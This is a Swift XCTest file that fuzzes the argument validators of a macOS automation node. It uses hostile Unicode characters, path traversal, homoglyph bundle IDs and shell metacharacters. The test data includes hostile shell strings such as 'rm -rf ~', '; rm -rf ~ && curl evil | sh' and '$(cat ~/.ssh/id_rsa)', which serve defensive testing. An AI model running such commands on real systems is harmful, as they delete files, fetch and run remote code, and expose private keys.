// Argument validation with the identical pattern strings of the v2 contract
// files (runbook B5; Phase 10 brief D3, D5 check 20): the node validates
// `text`, `title` and `repo_path` with the vendored schemas as written (no
// CharacterSet approximation), replays the hostile-insert families of
// backend/nodes/tests/test_capabilities_v2.py, mirrors `x-friday-max-bytes`,
// and accepts exactly the code points CPython's `re.fullmatch` accepts for
// every free-string pattern (a differential over all of Unicode).

import Foundation
import NodeCore
import XCTest

enum Fuzz {
    /// A one-scalar string (Swift refuses noncharacter `\u{...}` literals).
    static func scalar(_ value: UInt32) -> String { String(Character(Unicode.Scalar(value)!)) }

    static let validArgs: [String: JSONValue] = [
        "repo.command.run": ["repo_path": "~/work/acme", "command_kind": "test"],
        "applescript.recipe.run": ["recipe": "music.play_pause", "params": [:]],
        "ax.press": ["bundle_id": "com.apple.Safari", "role": "button", "title": "Yeniden Yükle"],
        "ax.type_text": ["bundle_id": "com.apple.Notes", "text": "merhaba\ndünya", "submit": false],
        "apps.open": ["bundle_id": "com.apple.Terminal"],
        "apps.focus": ["bundle_id": "com.googlecode.iterm2"],
    ]
    static let validParams: [String: JSONValue] = [
        "music.play_pause": [:],
        "music.next_track": [:],
        "system.volume_set": ["level": 50],
        "finder.reveal_repo": ["repo_path": "~/work/acme"],
        "terminal.open_repo": ["repo_path": "/Users/owner/My Projects/çalışma"],
    ]
    static let pathProperties: Set<String> = ["repo_path"]
    static let bundleProperties: Set<String> = ["bundle_id"]
    static let newlineAllowed: Set<String> = ["ax.type_text.text"]

    /// HOSTILE_INSERTS, minus `surrogate` ("\ud800"): a Swift String cannot
    /// hold a lone surrogate, and the node's strict parser refuses the
    /// escape (check 2) before args are ever validated
    /// (`testUnrepresentableFamiliesNeverReachTheValidator`).
    static let hostileInserts: [(String, String)] = [
        ("nul", "\u{0}"), ("c0_soh", "\u{1}"), ("c0_escape", "\u{1b}[31m"), ("c0_tab", "\t"), ("c0_cr", "\r"),
        ("del", "\u{7f}"), ("c1_nel", "\u{85}"), ("c1_csi", "\u{9b}"), ("bidi_rlo", "\u{202e}"),
        ("bidi_lre", "\u{202a}"), ("bidi_lri", "\u{2066}"), ("bidi_pdi", "\u{2069}"), ("bidi_alm", "\u{061c}"),
        ("bidi_lrm", "\u{200e}"), ("zero_width_space", "\u{200b}"), ("zero_width_joiner", "\u{200d}"),
        ("word_joiner", "\u{2060}"), ("invisible_times", "\u{2062}"), ("mongolian_vowel_separator", "\u{180e}"),
        ("bom", "\u{feff}"), ("line_separator", "\u{2028}"), ("paragraph_separator", "\u{2029}"),
        ("soft_hyphen", "\u{ad}"), ("combining_grapheme_joiner", "\u{034f}"), ("arabic_number_sign", "\u{0600}"),
        ("syriac_abbreviation_mark", "\u{070f}"), ("hangul_choseong_filler", "\u{115f}"),
        ("khmer_inherent_aq", "\u{17b4}"), ("mongolian_fvs1", "\u{180b}"),
        ("inhibit_symmetric_swapping", "\u{206a}"), ("nominal_digit_shapes", "\u{206f}"),
        ("braille_blank", "\u{2800}"), ("hangul_filler", "\u{3164}"), ("private_use", "\u{e000}"),
        ("noncharacter_fdd0", scalar(0xFDD0)), ("variation_selector_16", "\u{fe0f}"),
        ("halfwidth_hangul_filler", "\u{ffa0}"), ("interlinear_anchor", "\u{fff9}"),
        ("interlinear_terminator", "\u{fffb}"), ("noncharacter_ffff", scalar(0xFFFF)),
        ("kaithi_number_sign", "\u{110bd}"), ("egyptian_joiner", "\u{13430}"), ("shorthand_format", "\u{1bca0}"),
        ("musical_begin_beam", "\u{1d173}"), ("language_tag", "\u{e0001}"), ("tag_latin_a", "\u{e0041}"),
        ("cancel_tag", "\u{e007f}"), ("variation_selector_17", "\u{e0100}"),
        ("supplementary_private_use", "\u{f0000}"), ("unassigned_plane_4", "\u{40000}"),
    ]
    static let typeConfusion: [(String, JSONValue)] = [
        ("int", 1), ("bool", true), ("null", nil), ("list", ["x"]), ("object", ["x": "y"]),
    ]
    static let traversal = [
        "~/work/../secret", "~/work/..", "~/..", "/Users/owner/../../etc", "/./etc", "~/./work", "relative/path",
        "~", "/", "~/work//double", "\\\\server\\share", "~/work/...", "~/.../work", "/..../etc",
    ]
    static let shellMetacharacters = [
        ";", "|", "&", "$(id)", "`id`", ">", "<", "*", "?", "'", "\"", "\\", "!", "{a,b}", "[ab]",
    ]
    static let nonASCIIBundleIDs = [
        "com.аpple.Terminal", "com.apple.Términal", "ｃｏｍ.apple.Terminal", "com.apple.Terminal\u{200b}",
        "com.apple.Termİnal", "com.apple.终端",
    ]
    static let malformedBundleIDs = [
        "com", "com..apple", ".com.apple", "com.apple.", "com.apple.Terminal\n", "com.apple.Terminal app",
        "com/apple/Terminal", "a." + String(repeating: "b", count: 64), Array(repeating: "a", count: 9).joined(separator: "."),
        "com.apple." + String(repeating: "x", count: 150),
    ]

    static func types(_ sub: JSONValue) -> [String] {
        if let name = sub["type"]?.stringValue { return [name] }
        return (sub["type"]?.arrayValue ?? []).compactMap(\.stringValue)
    }

    /// `_string_cases`: inserts in the middle (after two characters) and at
    /// the end; newline families; oversize; paths; bundle ids; enums;
    /// empty; type confusion.
    static func stringCases(owner: String, name: String, sub: JSONValue, base: String) -> [(String, JSONValue)] {
        var cases: [(String, JSONValue)] = []
        let scalars = Array(base.unicodeScalars)
        let head = String(String.UnicodeScalarView(scalars.prefix(2)))
        let rest = String(String.UnicodeScalarView(scalars.dropFirst(2)))
        for (family, insert) in hostileInserts {
            cases.append(("\(family)_middle", .string(head + insert + rest)))
            cases.append(("\(family)_end", .string(base + insert)))
        }
        if !newlineAllowed.contains("\(owner).\(name)") {
            cases.append(("newline", .string(base + "\nrm -rf ~")))
            cases.append(("trailing_newline", .string(base + "\n")))
        }
        if pathProperties.contains(name) {
            cases.append(("oversize", .string("~/" + Array(repeating: String(repeating: "a", count: 200), count: 6).joined(separator: "/"))))
            cases += traversal.map { ("traversal:\($0)", .string($0)) }
            cases += shellMetacharacters.map { ("shell:\($0)", .string("~/work/a\($0)b")) }
        } else {
            let limit = Int(sub["maxLength"]?.intValue ?? 0)
            cases.append(("oversize", .string(String(repeating: "a", count: limit + 1))))
        }
        if bundleProperties.contains(name) {
            cases += nonASCIIBundleIDs.map { ("non_ascii:\($0)", .string($0)) }
            cases += malformedBundleIDs.map { ("malformed:\($0)", .string($0)) }
        }
        if sub["enum"] != nil {
            cases += [("enum_case", .string(base.uppercased())), ("enum_unknown", "deploy"), ("enum_empty", "")]
        }
        if (sub["minLength"]?.intValue ?? 0) >= 1 { cases.append(("empty", "")) }
        cases += typeConfusion.map { ("type:\($0.0)", $0.1) }
        return cases
    }

    /// `_integer_cases` minus `float` and `huge` (2**63), which the strict
    /// parser refuses before validation.
    static func integerCases(_ sub: JSONValue) -> [(String, JSONValue)] {
        let minimum = sub["minimum"]?.intValue ?? 0
        let maximum = sub["maximum"]?.intValue ?? 0
        return [
            ("below_minimum", .int(minimum - 1)), ("above_maximum", .int(maximum + 1)),
            ("string", .string(String(minimum))), ("bool", true), ("null", nil),
        ]
    }

    static let booleanCases: [(String, JSONValue)] = [
        ("string", "true"), ("int_one", 1), ("int_zero", 0), ("null", nil), ("list", [true]),
    ]

    /// `fuzz_cases`: every property gets the families of its type, then
    /// extra keys, missing keys and non-objects.
    static func cases(owner: String, schema: JSONValue, valid: JSONValue) -> [(String, JSONValue)] {
        var cases: [(String, JSONValue)] = []
        let fields = valid.objectValue ?? [:]
        for (name, sub) in (schema["properties"]?.objectValue ?? [:]).sorted(by: { $0.key < $1.key }) {
            let kinds = types(sub)
            let perProperty: [(String, JSONValue)]
            if kinds.contains("string") {
                perProperty = stringCases(owner: owner, name: name, sub: sub, base: fields[name]?.stringValue ?? "")
            } else if kinds.contains("integer") {
                perProperty = integerCases(sub)
            } else if kinds.contains("boolean") {
                perProperty = booleanCases
            } else {
                perProperty = typeConfusion.filter { $0.0 != "object" }.map { ("type:\($0.0)", $0.1) }
            }
            for (family, value) in perProperty {
                var changed = fields
                changed[name] = value
                cases.append(("\(name):\(family)", .object(changed)))
            }
        }
        var extra = fields
        extra["extra"] = 1
        cases.append(("extra_key", .object(extra)))
        var policy = fields
        policy["allowlist"] = ["*"]
        cases.append(("extra_policy_key", .object(policy)))
        for name in (schema["required"]?.arrayValue ?? []).compactMap(\.stringValue) {
            var missing = fields
            missing.removeValue(forKey: name)
            cases.append(("missing:\(name)", .object(missing)))
        }
        cases += [("not_an_object:list", [valid]), ("not_an_object:null", nil), ("not_an_object:str", "x")]
        return cases
    }

    /// The node's own check 20 for one capability's args.
    static func refused(_ capability: String, _ args: JSONValue) -> Bool {
        guard let contract = CapabilityContract.actions.first(where: { $0.name == capability }) else { return false }
        return !NodeCoreProbe.argsValid(capability: capability, args: args, schema: contract.argsSchema)
    }
}

/// Check 20 through the public verifier, on a signed-looking envelope's
/// args only (schema and recipe params): the same code path as a session.
enum NodeCoreProbe {
    static func argsValid(capability: String, args: JSONValue, schema: JSONValue) -> Bool {
        guard Schema.isValid(args, against: schema) else { return false }
        guard capability == ActionContracts.recipeCapability else { return true }
        guard let name = args["recipe"]?.stringValue, let recipe = RecipeContract.all[name] else { return false }
        return Schema.isValid(args["params"] ?? .null, against: recipe.paramsSchema)
    }
}

final class ArgsValidationTests: XCTestCase {
    func testTheValidSamplesValidate() {
        for (name, args) in Fuzz.validArgs { XCTAssertFalse(Fuzz.refused(name, args), name) }
        for (name, params) in Fuzz.validParams {
            XCTAssertFalse(Fuzz.refused(ActionContracts.recipeCapability, ["recipe": .string(name), "params": params]), name)
        }
    }

    func testEveryCapabilitySchemaRefusesItsFuzzFamilies() {
        var total = 0
        for contract in CapabilityContract.actions {
            let valid = Fuzz.validArgs[contract.name] ?? [:]
            for (family, args) in Fuzz.cases(owner: contract.name, schema: contract.argsSchema, valid: valid) {
                total += 1
                XCTAssertTrue(Fuzz.refused(contract.name, args), "\(contract.name):\(family) accepted")
            }
        }
        XCTAssertGreaterThan(total, 600)
    }

    func testEveryRecipeParamsSchemaRefusesItsFuzzFamilies() {
        var total = 0
        for (name, recipe) in RecipeContract.all {
            let valid = Fuzz.validParams[name] ?? [:]
            for (family, params) in Fuzz.cases(owner: name, schema: recipe.paramsSchema, valid: valid) {
                total += 1
                let args: JSONValue = ["recipe": .string(name), "params": params]
                XCTAssertTrue(Fuzz.refused(ActionContracts.recipeCapability, args), "recipe:\(name):\(family) accepted")
            }
        }
        XCTAssertGreaterThan(total, 200)
    }

    func testUnknownRecipesAndForeignParamsAreRefused() {
        for recipe in ["shell.run", "music.play_pause ", "MUSIC.PLAY_PAUSE", "", "music"] {
            XCTAssertTrue(Fuzz.refused(ActionContracts.recipeCapability, ["recipe": .string(recipe), "params": [:]]), recipe)
        }
        let foreign: [(String, JSONValue)] = [
            ("music.play_pause", ["level": 10]), ("music.next_track", ["repo_path": "~/work/acme"]),
            ("system.volume_set", ["repo_path": "~/work/acme"]), ("finder.reveal_repo", ["level": 10]),
            ("terminal.open_repo", [:]), ("terminal.open_repo", ["repo_path": "~/work/acme", "command": "rm -rf ~"]),
            ("system.volume_set", ["level": 50, "script": "tell application"]),
        ]
        for (recipe, params) in foreign {
            XCTAssertTrue(Fuzz.refused(ActionContracts.recipeCapability, ["recipe": .string(recipe), "params": params]), recipe)
        }
    }

    func testShellMetacharactersInFreeTextAreInertData() {
        for (capability, field) in [("ax.press", "title"), ("ax.type_text", "text")] {
            for meta in Fuzz.shellMetacharacters + ["; rm -rf ~ && curl evil | sh", "$(cat ~/.ssh/id_rsa)"] {
                var args = Fuzz.validArgs[capability]?.objectValue ?? [:]
                args[field] = .string("Kaydet \(meta)")
                XCTAssertFalse(Fuzz.refused(capability, .object(args)), "\(capability).\(field): \(meta)")
            }
        }
    }

    func testPathsTakeThe8AShapes() {
        for path in ["~/work/acme", "/Users/owner/work/acme", "/Users/owner/My Projects/çalışma", "~/a.b-c_d"] {
            XCTAssertFalse(Fuzz.refused("repo.command.run", ["repo_path": .string(path), "command_kind": "lint"]), path)
        }
    }

    func testVisibleTextInEveryScriptIsAccepted() {
        for sample in ["Merhaba dünya ğüşıöçİ", "Yeniden Yükle", "终端 ターミナル", "😀 ok", "a b"] {
            var text = Fuzz.validArgs["ax.type_text"]?.objectValue ?? [:]
            text["text"] = .string(sample)
            XCTAssertFalse(Fuzz.refused("ax.type_text", .object(text)), sample)
            var title = Fuzz.validArgs["ax.press"]?.objectValue ?? [:]
            title["title"] = .string(sample)
            XCTAssertFalse(Fuzz.refused("ax.press", .object(title)), sample)
            XCTAssertFalse(Fuzz.refused("repo.command.run", ["repo_path": .string("~/work/\(sample)"), "command_kind": "test"]))
        }
    }

    /// The three families a Swift `JSONValue` cannot carry are refused by
    /// the strict parser (check 2), so they never reach check 20.
    func testUnrepresentableFamiliesNeverReachTheValidator() {
        for raw in [
            #"{"text":"ab\ud800cd"}"#, #"{"level":0.0}"#, #"{"level":9223372036854775808}"#, #"{"level":1e3}"#,
        ] {
            XCTAssertThrowsError(try JSON.parse(raw), raw)
        }
    }

    /// `x-friday-max-bytes` (UTF-8 bytes; `maxLength` counts code points).
    func testMaxBytesIsMirrored() throws {
        let schema: JSONValue = ["type": "string", "maxLength": 4096, "x-friday-max-bytes": 4096]
        XCTAssertTrue(Schema.isValid(.string(String(repeating: "a", count: 4096)), against: schema))
        XCTAssertFalse(Schema.isValid(.string(String(repeating: "ğ", count: 2049)), against: schema))
        XCTAssertTrue(Schema.isValid(.string(String(repeating: "ğ", count: 2048)), against: schema))
        let tail = try XCTUnwrap(NodeProtocol.schema(for: "result", version: 2)?["properties"]?["tail"])
        XCTAssertEqual(tail["x-friday-max-bytes"]?.intValue, 4096)
        XCTAssertFalse(Schema.isValid(.string(String(repeating: "😀", count: 1025)), against: tail))
        let data = try XCTUnwrap(NodeProtocol.schema(for: "output", version: 2)?["properties"]?["data"])
        XCTAssertEqual(data["x-friday-max-bytes"]?.intValue, 8192)
        XCTAssertFalse(Schema.isValid(.string(String(repeating: "ş", count: 4097)), against: data))
    }

    /// For every free-string pattern of the contracts (the strings the
    /// node's validator uses, read from the vendored files), the set of code
    /// points accepted in a sample equals CPython's `re.fullmatch` set.
    func testFreeStringPatternsAcceptExactlyWhatPythonAccepts() throws {
        let python = URL(fileURLWithPath: "/usr/bin/python3")
        guard FileManager.default.isExecutableFile(atPath: python.path) else {
            throw XCTSkip("python3 is not installed")
        }
        var patterns: [(String, String, String)] = []  // (owner, property, pattern)
        for contract in CapabilityContract.actions {
            for (name, sub) in contract.argsSchema["properties"]?.objectValue ?? [:] where ["text", "title", "repo_path"].contains(name) {
                patterns.append((contract.name, name, try XCTUnwrap(sub["pattern"]?.stringValue)))
            }
        }
        for (name, recipe) in RecipeContract.all {
            for (property, sub) in recipe.paramsSchema["properties"]?.objectValue ?? [:] where property == "repo_path" {
                patterns.append(("recipe:\(name)", property, try XCTUnwrap(sub["pattern"]?.stringValue)))
            }
        }
        XCTAssertEqual(patterns.count, 5)
        let input = try JSON.encode(.array(patterns.map { .array([.string($0.1), .string($0.2)]) }))
        let script = """
            import json, re, sys
            out = []
            for prop, pattern in json.loads(sys.stdin.read()):
                compiled = re.compile(pattern)
                accepted = []
                for cp in range(0x110000):
                    if 0xD800 <= cp <= 0xDFFF:
                        continue
                    sample = f"~/work/a{chr(cp)}b" if prop == "repo_path" else f"ab{chr(cp)}cd"
                    if compiled.fullmatch(sample):
                        if accepted and accepted[-1][1] == cp - 1:
                            accepted[-1][1] = cp
                        else:
                            accepted.append([cp, cp])
                out.append(accepted)
            print(json.dumps(out))
            """
        let process = Process()
        process.executableURL = python
        process.arguments = ["-I", "-c", script]
        let stdin = Pipe()
        let stdout = Pipe()
        process.standardInput = stdin
        process.standardOutput = stdout
        try process.run()
        stdin.fileHandleForWriting.write(Data(input.utf8))
        try stdin.fileHandleForWriting.close()
        let data = stdout.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        let expected = try XCTUnwrap(try JSON.parse(data).arrayValue)
        XCTAssertEqual(expected.count, patterns.count)
        for ((owner, property, pattern), want) in zip(patterns, expected) {
            let schema: JSONValue = ["type": "string", "pattern": .string(pattern)]
            var accepted: [[Int64]] = []
            for cp in UInt32(0)...0x10FFFF {
                guard let scalar = Unicode.Scalar(cp) else { continue }
                let insert = String(Character(scalar))
                let sample = property == "repo_path" ? "~/work/a\(insert)b" : "ab\(insert)cd"
                guard Schema.isValid(.string(sample), against: schema) else { continue }
                if let last = accepted.last, last[1] == Int64(cp) - 1 {
                    accepted[accepted.count - 1][1] = Int64(cp)
                } else {
                    accepted.append([Int64(cp), Int64(cp)])
                }
            }
            let wanted = (want.arrayValue ?? []).map { ($0.arrayValue ?? []).compactMap(\.intValue) }
            XCTAssertEqual(accepted, wanted, "\(owner).\(property)")
        }
    }
}
